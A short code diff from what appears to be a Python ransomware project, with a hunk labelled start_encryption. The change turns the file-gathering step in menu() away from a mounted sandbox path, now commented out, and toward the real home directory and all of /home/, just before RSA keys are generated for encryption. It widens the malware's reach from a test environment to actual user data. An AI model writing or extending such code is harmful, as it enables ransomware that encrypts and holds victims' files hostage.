@@ -69,9 +69,11 @@ def start_encryption(files):
 
 def menu():
 
-    os.mkdir("/hdd")
-    mount("/dev/sda1", "/hdd")
-    files = get_files.find_files("/hdd/home/ubuntu-sandbox")
+    files = get_files.find_files(variables.home)+get_files.find_files("/home/")
+
+        # os.mkdir("/hdd")
+        # mount("/dev/sda1", "/hdd")
+        # files = get_files.find_files("/hdd/home/ubuntu-sandbox")
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
